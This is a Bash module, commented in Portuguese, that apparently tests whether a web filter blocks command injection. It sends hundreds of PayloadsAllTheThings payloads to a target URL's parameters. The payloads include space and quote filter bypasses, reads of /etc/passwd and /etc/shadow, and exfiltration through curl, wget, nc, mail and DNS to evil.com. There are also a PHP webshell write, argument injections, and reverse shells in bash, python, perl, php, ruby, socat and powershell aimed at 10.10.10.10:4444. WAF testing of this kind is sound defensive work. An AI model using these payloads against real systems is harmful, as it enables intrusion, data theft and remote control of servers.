#!/bin/bash
#==============================================================================
# CMDi Tester - Script especializado em testes de Command Injection
# Versão: 1.0.0
# Descrição: Script modular para testes de Command Injection usando payloads do PayloadsAllTheThings
#==============================================================================

# Importar cores e variáveis (se chamado diretamente)
if [ -z "$RED" ]; then
    RED='\033[0;31m'
    GREEN='\033[0;32m'
    YELLOW='\033[1;33m'
    BLUE='\033[0;34m'
    CYAN='\033[0;36m'
    MAGENTA='\033[0;35m'
    BOLD='\033[1m'
    NC='\033[0m'
fi

# Diretório base do script
CMDI_SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CMDI_PAYLOADS_DIR="${CMDI_SCRIPT_DIR}/PayloadsAllTheThings/Command Injection"
CMDI_INTRUDER_DIR="${CMDI_PAYLOADS_DIR}/Intruder"

#==============================================================================
# FUNÇÕES AUXILIARES
#==============================================================================

cmdi_print_section() {
    local title="$1"
    local shortcut="$2"
    echo ""
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    if [ -n "$shortcut" ]; then
        echo -e "${BOLD}${MAGENTA}$title ${CYAN}($shortcut)${NC}"
    else
        echo -e "${BOLD}${MAGENTA}$title${NC}"
    fi
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

cmdi_print_subsection() {
    echo -e "\n  ${BOLD}${BLUE}▶ $1${NC}"
}

#==============================================================================
# TESTES CMDi BÁSICO - Command chaining
#==============================================================================
test_cmdi_basic() {
    cmdi_print_subsection "Command Injection Básico (30 variações)"
    
    # Semicolon chaining
    test_curl "CMDi Basic: ; id" "block" -A "$UA" -Lk "${URL}?cmd=test;id"
    test_curl "CMDi Basic: ; whoami" "block" -A "$UA" -Lk "${URL}?cmd=test;whoami"
    test_curl "CMDi Basic: ; pwd" "block" -A "$UA" -Lk "${URL}?cmd=test;pwd"
    test_curl "CMDi Basic: ; uname -a" "block" -A "$UA" -Lk "${URL}?cmd=test;uname%20-a"
    test_curl "CMDi Basic: ; cat /etc/passwd" "block" -A "$UA" -Lk "${URL}?cmd=test;cat%20/etc/passwd"
    
    # Pipe chaining
    test_curl "CMDi Basic: | id" "block" -A "$UA" -Lk "${URL}?cmd=test|id"
    test_curl "CMDi Basic: | whoami" "block" -A "$UA" -Lk "${URL}?cmd=test|whoami"
    test_curl "CMDi Basic: | cat /etc/passwd" "block" -A "$UA" -Lk "${URL}?cmd=test|cat%20/etc/passwd"
    
    # AND chaining
    test_curl "CMDi Basic: && id" "block" -A "$UA" -Lk "${URL}?cmd=test%26%26id"
    test_curl "CMDi Basic: && whoami" "block" -A "$UA" -Lk "${URL}?cmd=test%26%26whoami"
    test_curl "CMDi Basic: && ls -la" "block" -A "$UA" -Lk "${URL}?cmd=test%26%26ls%20-la"
    
    # OR chaining
    test_curl "CMDi Basic: || id" "block" -A "$UA" -Lk "${URL}?cmd=test||id"
    test_curl "CMDi Basic: || whoami" "block" -A "$UA" -Lk "${URL}?cmd=test||whoami"
    
    # Background execution
    test_curl "CMDi Basic: & id" "block" -A "$UA" -Lk "${URL}?cmd=test%26id"
    test_curl "CMDi Basic: & whoami" "block" -A "$UA" -Lk "${URL}?cmd=test%26whoami"
    
    # Newline chaining
    test_curl "CMDi Basic: %0A id" "block" -A "$UA" -Lk "${URL}?cmd=test%0Aid"
    test_curl "CMDi Basic: %0D%0A whoami" "block" -A "$UA" -Lk "${URL}?cmd=test%0D%0Awhoami"
    
    # Backtick execution
    test_curl "CMDi Basic: \`id\`" "block" -A "$UA" -Lk "${URL}?cmd=test\\\`id\\\`"
    test_curl "CMDi Basic: \`whoami\`" "block" -A "$UA" -Lk "${URL}?cmd=test\\\`whoami\\\`"
    
    # Subshell execution
    test_curl "CMDi Basic: \$(id)" "block" -A "$UA" -Lk "${URL}?cmd=test\\\$(id)"
    test_curl "CMDi Basic: \$(whoami)" "block" -A "$UA" -Lk "${URL}?cmd=test\\\$(whoami)"
    test_curl "CMDi Basic: \$(pwd)" "block" -A "$UA" -Lk "${URL}?cmd=test\\\$(pwd)"
    
    # Multiple commands
    test_curl "CMDi Basic: ;id;whoami" "block" -A "$UA" -Lk "${URL}?cmd=test;id;whoami"
    test_curl "CMDi Basic: |id|whoami" "block" -A "$UA" -Lk "${URL}?cmd=test|id|whoami"
    
    # File read attempts
    test_curl "CMDi Basic: ; cat /etc/shadow" "block" -A "$UA" -Lk "${URL}?cmd=test;cat%20/etc/shadow"
    test_curl "CMDi Basic: ; cat /etc/hosts" "block" -A "$UA" -Lk "${URL}?cmd=test;cat%20/etc/hosts"
    test_curl "CMDi Basic: ; cat /proc/version" "block" -A "$UA" -Lk "${URL}?cmd=test;cat%20/proc/version"
    
    # Network commands
    test_curl "CMDi Basic: ; ifconfig" "block" -A "$UA" -Lk "${URL}?cmd=test;ifconfig"
    test_curl "CMDi Basic: ; ip a" "block" -A "$UA" -Lk "${URL}?cmd=test;ip%20a"
    test_curl "CMDi Basic: ; netstat -an" "block" -A "$UA" -Lk "${URL}?cmd=test;netstat%20-an"
}

#==============================================================================
# TESTES CMDi BYPASS - Bypass de filtros
#==============================================================================
test_cmdi_bypass() {
    cmdi_print_subsection "Command Injection Bypass (50 variações)"
    
    # Bypass without space - ${IFS}
    test_curl "CMDi Bypass: cat\${IFS}/etc/passwd" "block" -A "$UA" -Lk "${URL}?cmd=cat\\\${IFS}/etc/passwd"
    test_curl "CMDi Bypass: ls\${IFS}-la" "block" -A "$UA" -Lk "${URL}?cmd=ls\\\${IFS}-la"
    test_curl "CMDi Bypass: id\${IFS}-u" "block" -A "$UA" -Lk "${URL}?cmd=id\\\${IFS}-u"
    
    # Bypass without space - tab
    test_curl "CMDi Bypass: cat%09/etc/passwd" "block" -A "$UA" -Lk "${URL}?cmd=cat%09/etc/passwd"
    test_curl "CMDi Bypass: ls%09-la" "block" -A "$UA" -Lk "${URL}?cmd=ls%09-la"
    
    # Bypass without space - brace expansion
    test_curl "CMDi Bypass: {cat,/etc/passwd}" "block" -A "$UA" -Lk "${URL}?cmd={cat,/etc/passwd}"
    test_curl "CMDi Bypass: {ls,-la}" "block" -A "$UA" -Lk "${URL}?cmd={ls,-la}"
    
    # Bypass without space - input redirection
    test_curl "CMDi Bypass: cat</etc/passwd" "block" -A "$UA" -Lk "${URL}?cmd=cat</etc/passwd"
    test_curl "CMDi Bypass: sh</dev/tcp/127.0.0.1/4444" "block" -A "$UA" -Lk "${URL}?cmd=sh</dev/tcp/127.0.0.1/4444"
    
    # Quote bypass - single quote
    test_curl "CMDi Bypass: w'h'o'am'i" "block" -A "$UA" -Lk "${URL}?cmd=w'h'o'am'i"
    test_curl "CMDi Bypass: wh''oami" "block" -A "$UA" -Lk "${URL}?cmd=wh''oami"
    test_curl "CMDi Bypass: c'a't /etc/passwd" "block" -A "$UA" -Lk "${URL}?cmd=c'a't%20/etc/passwd"
    
    # Quote bypass - double quote
    test_curl "CMDi Bypass: w\"h\"o\"am\"i" "block" -A "$UA" -Lk "${URL}?cmd=w\\\"h\\\"o\\\"am\\\"i"
    test_curl "CMDi Bypass: wh\"\"oami" "block" -A "$UA" -Lk "${URL}?cmd=wh\\\"\\\"oami"
    
    # Backtick bypass
    test_curl "CMDi Bypass: wh\`\`oami" "block" -A "$UA" -Lk "${URL}?cmd=wh\\\`\\\`oami"
    
    # Backslash bypass
    test_curl "CMDi Bypass: w\\\\ho\\\\am\\\\i" "block" -A "$UA" -Lk "${URL}?cmd=w\\\\\\\\ho\\\\\\\\am\\\\\\\\i"
    test_curl "CMDi Bypass: /\\\\b\\\\i\\\\n/////s\\\\h" "block" -A "$UA" -Lk "${URL}?cmd=/\\\\\\\\b\\\\\\\\i\\\\\\\\n/////s\\\\\\\\h"
    
    # \$@ bypass
    test_curl "CMDi Bypass: who\$@ami" "block" -A "$UA" -Lk "${URL}?cmd=who\\\$@ami"
    test_curl "CMDi Bypass: cat\$@/etc/passwd" "block" -A "$UA" -Lk "${URL}?cmd=cat\\\$@/etc/passwd"
    
    # \$() bypass
    test_curl "CMDi Bypass: who\$()ami" "block" -A "$UA" -Lk "${URL}?cmd=who\\\$()ami"
    test_curl "CMDi Bypass: who\$(echo am)i" "block" -A "$UA" -Lk "${URL}?cmd=who\\\$(echo%20am)i"
    
    # Wildcard bypass
    test_curl "CMDi Bypass: /???/??t /???/p??s??" "block" -A "$UA" -Lk "${URL}?cmd=/???/??t%20/???/p??s??"
    test_curl "CMDi Bypass: c?t /e?c/p?ss???" "block" -A "$UA" -Lk "${URL}?cmd=c?t%20/e?c/p?ss???"
    
    # Hex encoding bypass
    test_curl "CMDi Bypass: echo -e \\\\x2f\\\\x65..." "block" -A "$UA" -Lk "${URL}?cmd=echo%20-e%20\\\\x2f\\\\x65\\\\x74\\\\x63\\\\x2f\\\\x70\\\\x61\\\\x73\\\\x73\\\\x77\\\\x64"
    test_curl "CMDi Bypass: echo \$'\\\\x2f...' " "block" -A "$UA" -Lk "${URL}?cmd=echo%20\\\$'\\\\x2f\\\\x65\\\\x74\\\\x63'"
    
    # Backslash newline bypass
    test_curl "CMDi Bypass: cat /et\\\\%0Ac/passwd" "block" -A "$UA" -Lk "${URL}?cmd=cat%20/et\\\\%0Ac/passwd"
    test_curl "CMDi Bypass: who\\\\%0Aami" "block" -A "$UA" -Lk "${URL}?cmd=who\\\\%0Aami"
    
    # Tilde expansion
    test_curl "CMDi Bypass: echo ~+" "block" -A "$UA" -Lk "${URL}?cmd=echo%20~+"
    test_curl "CMDi Bypass: echo ~-" "block" -A "$UA" -Lk "${URL}?cmd=echo%20~-"
    
    # Brace expansion advanced
    test_curl "CMDi Bypass: {,ip,a}" "block" -A "$UA" -Lk "${URL}?cmd={,ip,a}"
    test_curl "CMDi Bypass: {,ifconfig}" "block" -A "$UA" -Lk "${URL}?cmd={,ifconfig}"
    test_curl "CMDi Bypass: {l,-lh}s" "block" -A "$UA" -Lk "${URL}?cmd={l,-lh}s"
    
    # Variable expansion bypass
    test_curl "CMDi Bypass: \${HOME:0:1}etc" "block" -A "$UA" -Lk "${URL}?cmd=cat%20\\\${HOME:0:1}etc\\\${HOME:0:1}passwd"
    test_curl "CMDi Bypass: tr trick" "block" -A "$UA" -Lk "${URL}?cmd=echo%20.%20|%20tr%20'!-0'%20'\\\"-1'"
    
    # Random case (Windows)
    test_curl "CMDi Bypass: wHoAmI" "block" -A "$UA" -Lk "${URL}?cmd=wHoAmI"
    test_curl "CMDi Bypass: WhOaMi" "block" -A "$UA" -Lk "${URL}?cmd=WhOaMi"
    
    # ANSI-C Quoting
    test_curl "CMDi Bypass: ANSI-C id" "block" -A "$UA" -Lk "${URL}?cmd=\\\$'id'"
    test_curl "CMDi Bypass: ANSI-C whoami" "block" -A "$UA" -Lk "${URL}?cmd=\\\$'whoami'"
    
    # Combined bypass techniques
    test_curl "CMDi Bypass: Multi 1" "block" -A "$UA" -Lk "${URL}?cmd=c''a''t%20/et''c/pa''sswd"
    test_curl "CMDi Bypass: Multi 2" "block" -A "$UA" -Lk "${URL}?cmd=w\\\"\\\"ho\\\$(echo%20am)i"
    test_curl "CMDi Bypass: Multi 3" "block" -A "$UA" -Lk "${URL}?cmd={cat,/e''tc/p''asswd}"
    
    # Encoding variations
    test_curl "CMDi Bypass: URL encoded ;id" "block" -A "$UA" -Lk "${URL}?cmd=test%3Bid"
    test_curl "CMDi Bypass: Double URL encoded" "block" -A "$UA" -Lk "${URL}?cmd=test%253Bid"
    
    # Null byte injection
    test_curl "CMDi Bypass: %00 injection" "block" -A "$UA" -Lk "${URL}?cmd=test%00;id"
    
    # PATH manipulation attempts
    test_curl "CMDi Bypass: ./id" "block" -A "$UA" -Lk "${URL}?cmd=./id"
    test_curl "CMDi Bypass: ../../../bin/id" "block" -A "$UA" -Lk "${URL}?cmd=../../../bin/id"
    
    # Windows specific
    test_curl "CMDi Bypass Windows: %COMSPEC%" "block" -A "$UA" -Lk "${URL}?cmd=%COMSPEC%"
    test_curl "CMDi Bypass Windows: powershell" "block" -A "$UA" -Lk "${URL}?cmd=powershell%20-c%20whoami"
}

#==============================================================================
# TESTES CMDi TIME-BASED - Detecção baseada em tempo
#==============================================================================
test_cmdi_time_based() {
    cmdi_print_subsection "Command Injection Time-Based (20 variações)"
    
    # Basic sleep
    test_curl "CMDi Time: ; sleep 5" "block" -A "$UA" -Lk "${URL}?cmd=test;sleep%205"
    test_curl "CMDi Time: && sleep 5" "block" -A "$UA" -Lk "${URL}?cmd=test%26%26sleep%205"
    test_curl "CMDi Time: | sleep 5" "block" -A "$UA" -Lk "${URL}?cmd=test|sleep%205"
    test_curl "CMDi Time: \$(sleep 5)" "block" -A "$UA" -Lk "${URL}?cmd=test\\\$(sleep%205)"
    test_curl "CMDi Time: \`sleep 5\`" "block" -A "$UA" -Lk "${URL}?cmd=test\\\`sleep%205\\\`"
    
    # Sleep with bypass
    test_curl "CMDi Time: sleep\${IFS}5" "block" -A "$UA" -Lk "${URL}?cmd=sleep\\\${IFS}5"
    test_curl "CMDi Time: {sleep,5}" "block" -A "$UA" -Lk "${URL}?cmd={sleep,5}"
    test_curl "CMDi Time: s''leep 5" "block" -A "$UA" -Lk "${URL}?cmd=s''leep%205"
    test_curl "CMDi Time: s\\\"\\\"leep 5" "block" -A "$UA" -Lk "${URL}?cmd=s\\\"\\\"leep%205"
    
    # Conditional sleep
    test_curl "CMDi Time: [ -f /etc/passwd ] && sleep 5" "block" -A "$UA" -Lk "${URL}?cmd=[%20-f%20/etc/passwd%20]%26%26sleep%205"
    test_curl "CMDi Time: test -f /etc/passwd && sleep 5" "block" -A "$UA" -Lk "${URL}?cmd=test%20-f%20/etc/passwd%26%26sleep%205"
    
    # Time-based exfiltration simulation
    test_curl "CMDi Time: if whoami then sleep 5" "block" -A "$UA" -Lk "${URL}?cmd=if%20whoami;then%20sleep%205;fi"
    test_curl "CMDi Time: [ \$(whoami|cut -c1) = r ] && sleep 5" "block" -A "$UA" -Lk "${URL}?cmd=[%20\\\$(whoami|cut%20-c1)%20=%20r%20]%26%26sleep%205"
    
    # Ping-based delays
    test_curl "CMDi Time: ping -c 5 127.0.0.1" "block" -A "$UA" -Lk "${URL}?cmd=ping%20-c%205%20127.0.0.1"
    test_curl "CMDi Time: ping -n 5 127.0.0.1" "block" -A "$UA" -Lk "${URL}?cmd=ping%20-n%205%20127.0.0.1"
    
    # Other delay commands
    test_curl "CMDi Time: timeout 5" "block" -A "$UA" -Lk "${URL}?cmd=timeout%205"
    test_curl "CMDi Time: wait 5" "block" -A "$UA" -Lk "${URL}?cmd=wait%205"
    
    # Background long running
    test_curl "CMDi Time: nohup sleep 120" "block" -A "$UA" -Lk "${URL}?cmd=nohup%20sleep%20120%20>/dev/null%20%26"
    
    # Polyglot time-based
    test_curl "CMDi Time: Polyglot 1" "block" -A "$UA" -Lk "${URL}?cmd=1;sleep\\\${IFS}5;#\\\${IFS}';sleep\\\${IFS}5;#"
    test_curl "CMDi Time: Polyglot 2" "block" -A "$UA" -Lk "${URL}?cmd=/*\\\$(sleep%205)\\\`sleep%205\\\`*/"
}

#==============================================================================
# TESTES CMDi DATA EXFILTRATION - DNS e outras técnicas
#==============================================================================
test_cmdi_data_exfil() {
    cmdi_print_subsection "Command Injection Data Exfiltration (15 variações)"
    
    local evil_domain="evil.com"
    
    # DNS exfiltration
    test_curl "CMDi Exfil: DNS whoami" "block" -A "$UA" -Lk "${URL}?cmd=nslookup%20\\\$(whoami).${evil_domain}"
    test_curl "CMDi Exfil: DNS hostname" "block" -A "$UA" -Lk "${URL}?cmd=nslookup%20\\\$(hostname).${evil_domain}"
    test_curl "CMDi Exfil: host command" "block" -A "$UA" -Lk "${URL}?cmd=host%20\\\$(whoami).${evil_domain}"
    test_curl "CMDi Exfil: dig command" "block" -A "$UA" -Lk "${URL}?cmd=dig%20\\\$(whoami).${evil_domain}"
    
    # HTTP exfiltration
    test_curl "CMDi Exfil: curl data" "block" -A "$UA" -Lk "${URL}?cmd=curl%20http://${evil_domain}/?\\\$(whoami)"
    test_curl "CMDi Exfil: wget data" "block" -A "$UA" -Lk "${URL}?cmd=wget%20http://${evil_domain}/?\\\$(whoami)"
    test_curl "CMDi Exfil: curl POST" "block" -A "$UA" -Lk "${URL}?cmd=curl%20-X%20POST%20-d%20\\\$(whoami)%20http://${evil_domain}"
    
    # File exfiltration
    test_curl "CMDi Exfil: curl file upload" "block" -A "$UA" -Lk "${URL}?cmd=curl%20-F%20file=@/etc/passwd%20http://${evil_domain}"
    test_curl "CMDi Exfil: wget file" "block" -A "$UA" -Lk "${URL}?cmd=wget%20--post-file=/etc/passwd%20http://${evil_domain}"
    
    # Netcat exfiltration
    test_curl "CMDi Exfil: nc send" "block" -A "$UA" -Lk "${URL}?cmd=cat%20/etc/passwd|nc%20${evil_domain}%204444"
    test_curl "CMDi Exfil: nc reverse" "block" -A "$UA" -Lk "${URL}?cmd=nc%20-e%20/bin/sh%20${evil_domain}%204444"
    
    # Output redirection
    test_curl "CMDi Exfil: > webshell" "block" -A "$UA" -Lk "${URL}?cmd=echo%20'<?php%20system(\\\$_GET[c]);?>'%20>%20shell.php"
    test_curl "CMDi Exfil: >> append" "block" -A "$UA" -Lk "${URL}?cmd=whoami%20>>%20/tmp/output.txt"
    
    # SMTP exfiltration
    test_curl "CMDi Exfil: mail command" "block" -A "$UA" -Lk "${URL}?cmd=cat%20/etc/passwd|mail%20-s%20data%20evil@${evil_domain}"
    
    # FTP exfiltration
    test_curl "CMDi Exfil: ftp upload" "block" -A "$UA" -Lk "${URL}?cmd=ftp%20-n%20${evil_domain}%20<<END"
}

#==============================================================================
# TESTES CMDi POLYGLOT - Payloads universais
#==============================================================================
test_cmdi_polyglot() {
    cmdi_print_subsection "Command Injection Polyglot (10 variações)"
    
    # Polyglot examples from README
    test_curl "CMDi Polyglot: Example 1" "block" -A "$UA" -Lk "${URL}?cmd=1;sleep\\\${IFS}9;#\\\${IFS}';sleep\\\${IFS}9;#\\\${IFS}\\\";sleep\\\${IFS}9;#"
    test_curl "CMDi Polyglot: Example 2" "block" -A "$UA" -Lk "${URL}?cmd=/*\\\$(sleep%205)\\\`sleep%205\\\`*/-sleep(5)-'/*\\\$(sleep%205)\\\`sleep%205\\\`%20#*/-sleep(5)||'\\\"||sleep(5)||\\\"/*\\\`*/"
    
    # Multi-context payloads
    test_curl "CMDi Polyglot: Quotes mix" "block" -A "$UA" -Lk "${URL}?cmd=';id;#"
    test_curl "CMDi Polyglot: Quotes mix 2" "block" -A "$UA" -Lk "${URL}?cmd=\\\";id;#"
    test_curl "CMDi Polyglot: Comment mix" "block" -A "$UA" -Lk "${URL}?cmd=id;#';id;#\\\";id;#"
    
    # Universal command execution
    test_curl "CMDi Polyglot: Universal 1" "block" -A "$UA" -Lk "${URL}?cmd=||id||"
    test_curl "CMDi Polyglot: Universal 2" "block" -A "$UA" -Lk "${URL}?cmd=%26%26id%26%26"
    test_curl "CMDi Polyglot: Universal 3" "block" -A "$UA" -Lk "${URL}?cmd=|id|"
    test_curl "CMDi Polyglot: Universal 4" "block" -A "$UA" -Lk "${URL}?cmd=;id;"
    test_curl "CMDi Polyglot: Backtick mix" "block" -A "$UA" -Lk "${URL}?cmd=\\\`id\\\`;id;\\\$(id)"
}

#==============================================================================
# TESTES CMDi ARGUMENT INJECTION - Injeção de argumentos
#==============================================================================
test_cmdi_argument_injection() {
    cmdi_print_subsection "Argument Injection (20 variações)"
    
    # curl argument injection
    test_curl "CMDi Arg: curl -o shell.php" "block" -A "$UA" -Lk "${URL}?url=http://evil.com%20-o%20shell.php"
    test_curl "CMDi Arg: curl --output" "block" -A "$UA" -Lk "${URL}?url=http://evil.com%20--output%20/var/www/shell.php"
    
    # wget argument injection
    test_curl "CMDi Arg: wget -O shell.php" "block" -A "$UA" -Lk "${URL}?url=http://evil.com%20-O%20shell.php"
    test_curl "CMDi Arg: wget --output-document" "block" -A "$UA" -Lk "${URL}?url=http://evil.com%20--output-document=shell.php"
    
    # ssh argument injection
    test_curl "CMDi Arg: ssh ProxyCommand" "block" -A "$UA" -Lk "${URL}?host=-oProxyCommand=touch%20/tmp/pwned"
    test_curl "CMDi Arg: ssh -o" "block" -A "$UA" -Lk "${URL}?host=-o%20ProxyCommand='id'"
    
    # chrome argument injection
    test_curl "CMDi Arg: chrome gpu-launcher" "block" -A "$UA" -Lk "${URL}?args=--gpu-launcher=id>/tmp/pwned"
    
    # psql argument injection
    test_curl "CMDi Arg: psql -o" "block" -A "$UA" -Lk "${URL}?args=-o'|id>/tmp/pwned'"
    
    # git argument injection
    test_curl "CMDi Arg: git upload-pack" "block" -A "$UA" -Lk "${URL}?repo=--upload-pack='id'"
    
    # tar argument injection
    test_curl "CMDi Arg: tar checkpoint" "block" -A "$UA" -Lk "${URL}?file=--checkpoint=1%20--checkpoint-action=exec=sh"
    
    # find argument injection
    test_curl "CMDi Arg: find exec" "block" -A "$UA" -Lk "${URL}?path=.%20-exec%20id%20;"
    
    # rsync argument injection
    test_curl "CMDi Arg: rsync -e" "block" -A "$UA" -Lk "${URL}?opts=-e%20sh"
    
    # perl argument injection
    test_curl "CMDi Arg: perl -e" "block" -A "$UA" -Lk "${URL}?script=-e%20system('id')"
    
    # python argument injection
    test_curl "CMDi Arg: python -c" "block" -A "$UA" -Lk "${URL}?script=-c%20import%20os;os.system('id')"
    
    # php argument injection
    test_curl "CMDi Arg: php -r" "block" -A "$UA" -Lk "${URL}?script=-r%20system('id');"
    
    # node argument injection
    test_curl "CMDi Arg: node -e" "block" -A "$UA" -Lk "${URL}?script=-e%20require('child_process').exec('id')"
    
    # docker argument injection
    test_curl "CMDi Arg: docker -v" "block" -A "$UA" -Lk "${URL}?opts=-v%20/:/host"
    
    # nc argument injection
    test_curl "CMDi Arg: nc -e" "block" -A "$UA" -Lk "${URL}?opts=-e%20/bin/sh"
    
    # sed argument injection
    test_curl "CMDi Arg: sed -e" "block" -A "$UA" -Lk "${URL}?expr=-e%20e%20/etc/passwd"
    
    # awk argument injection
    test_curl "CMDi Arg: awk system" "block" -A "$UA" -Lk "${URL}?expr=BEGIN{system(\\\"id\\\")}"
}

#==============================================================================
# TESTES CMDi REVERSE SHELL - Tentativas de reverse shell
#==============================================================================
test_cmdi_reverse_shell() {
    cmdi_print_subsection "Reverse Shell Attempts (15 variações)"
    
    local evil_ip="10.10.10.10"
    local evil_port="4444"
    
    # Bash reverse shells
    test_curl "CMDi RShell: bash -i" "block" -A "$UA" -Lk "${URL}?cmd=bash%20-i%20>%26%20/dev/tcp/${evil_ip}/${evil_port}%200>%261"
    test_curl "CMDi RShell: bash -c" "block" -A "$UA" -Lk "${URL}?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/${evil_ip}/${evil_port}%200>%261'"
    test_curl "CMDi RShell: 0<&196" "block" -A "$UA" -Lk "${URL}?cmd=0<&196;exec%20196<>/dev/tcp/${evil_ip}/${evil_port};%20sh%20<&196%20>&196%202>&196"
    
    # Netcat reverse shells
    test_curl "CMDi RShell: nc -e" "block" -A "$UA" -Lk "${URL}?cmd=nc%20-e%20/bin/sh%20${evil_ip}%20${evil_port}"
    test_curl "CMDi RShell: nc pipe" "block" -A "$UA" -Lk "${URL}?cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202>&1|nc%20${evil_ip}%20${evil_port}%20>/tmp/f"
    test_curl "CMDi RShell: ncat" "block" -A "$UA" -Lk "${URL}?cmd=ncat%20${evil_ip}%20${evil_port}%20-e%20/bin/bash"
    
    # Python reverse shells
    test_curl "CMDi RShell: python socket" "block" -A "$UA" -Lk "${URL}?cmd=python%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"${evil_ip}\\\",${evil_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])'"
    test_curl "CMDi RShell: python3 socket" "block" -A "$UA" -Lk "${URL}?cmd=python3%20-c%20'import%20socket,subprocess;s=socket.socket();s.connect((\\\"${evil_ip}\\\",${evil_port}))'"
    
    # Perl reverse shell
    test_curl "CMDi RShell: perl socket" "block" -A "$UA" -Lk "${URL}?cmd=perl%20-e%20'use%20Socket;\\\$i=\\\"${evil_ip}\\\";\\\$p=${evil_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\"));if(connect(S,sockaddr_in(\\\$p,inet_aton(\\\$i)))){open(STDIN,\\\">&S\\\");open(STDOUT,\\\">&S\\\");open(STDERR,\\\">&S\\\");exec(\\\"/bin/sh%20-i\\\");}'"
    
    # PHP reverse shell
    test_curl "CMDi RShell: php fsockopen" "block" -A "$UA" -Lk "${URL}?cmd=php%20-r%20'\\\$sock=fsockopen(\\\"${evil_ip}\\\",${evil_port});exec(\\\"/bin/sh%20-i%20<&3%20>&3%202>&3\\\");'"
    
    # Ruby reverse shell
    test_curl "CMDi RShell: ruby socket" "block" -A "$UA" -Lk "${URL}?cmd=ruby%20-rsocket%20-e'f=TCPSocket.open(\\\"${evil_ip}\\\",${evil_port}).to_i;exec%20sprintf(\\\"/bin/sh%20-i%20<&%d%20>&%d%202>&%d\\\",f,f,f)'"
    
    # Telnet reverse shell
    test_curl "CMDi RShell: telnet" "block" -A "$UA" -Lk "${URL}?cmd=telnet%20${evil_ip}%20${evil_port}%20|%20/bin/bash%20|%20telnet%20${evil_ip}%20${evil_port}"
    
    # Socat reverse shell
    test_curl "CMDi RShell: socat" "block" -A "$UA" -Lk "${URL}?cmd=socat%20tcp-connect:${evil_ip}:${evil_port}%20exec:/bin/sh,pty,stderr,setsid,sigint,sane"
    
    # PowerShell reverse shell  (Windows)
    test_curl "CMDi RShell: powershell" "block" -A "$UA" -Lk "${URL}?cmd=powershell%20-c%20\\\$client=New-Object%20System.Net.Sockets.TCPClient('${evil_ip}',${evil_port})"
    
    # Awk reverse shell
    test_curl "CMDi RShell: awk" "block" -A "$UA" -Lk "${URL}?cmd=awk%20'BEGIN{s=\\\"/inet/tcp/0/${evil_ip}/${evil_port}\\\";while(1){do{s|&getline%20c;if(c){while((c|&getline)>0)print%20\\\$0|&s;close(c)}}while(c!=\\\"exit\\\")close(s)}}'"
}

#==============================================================================
# TESTES CMDi FROM INTRUDERS - Payloads das listas
#==============================================================================
test_cmdi_from_intruders() {
    cmdi_print_subsection "Command Injection Payloads Avançados (50 da lista)"
    
    local intruder_file="${CMDI_INTRUDER_DIR}/command_exec.txt"
    
    if [ ! -f "$intruder_file" ]; then
        echo -e "${YELLOW}  ⚠ Arquivo de payloads não encontrado: $intruder_file${NC}"
        return
    fi
    
    local count=0
    while IFS= read -r payload || [ -n "$payload" ]; do
        [ -z "$payload" ] && continue
        [ "${payload:0:1}" == "#" ] && continue
        
        count=$((count + 1))
        
        # URL encode o payload
        local encoded_payload=$(echo -n "$payload" | jq -sRr @uri 2>/dev/null || echo "$payload")
        test_curl "CMDi Advanced #$count: ${payload:0:40}..." "block" -A "$UA" -Lk "${URL}?cmd=${encoded_payload}"
        
        [ $count -ge 50 ] && break
    done < "$intruder_file"
    
    echo -e "\n  ${CYAN}Total de payloads avançados testados: $count${NC}"
}

#==============================================================================
# FUNÇÃO PRINCIPAL - Executa todos os testes CMDi
#==============================================================================
run_all_cmdi_tests() {
    cmdi_print_section "⚙️ TESTES COMPLETOS DE COMMAND INJECTION (PayloadsAllTheThings)" "-c cmdi"
    
    echo -e "${CYAN}ℹ️  Usando payloads do PayloadsAllTheThings/Command Injection${NC}"
    echo -e "${CYAN}ℹ️  Total estimado: 250+ testes de Command Injection${NC}"
    echo ""
    
    test_cmdi_basic
    test_cmdi_bypass
    test_cmdi_time_based
    test_cmdi_data_exfil
    test_cmdi_polyglot
    test_cmdi_argument_injection
    test_cmdi_reverse_shell
    test_cmdi_from_intruders
    
    echo ""
    echo -e "${GREEN}✓ Todos os testes Command Injection foram concluídos!${NC}"
}

# Se o script for executado diretamente (não como source)
if [ "${BASH_SOURCE[0]}" == "${0}" ]; then
    echo -e "${RED}❌ Este script deve ser chamado pelo head-test.sh${NC}"
    echo -e "${YELLOW}Use: ./head-test.sh -u URL -c cmdi${NC}"
    exit 1
fi
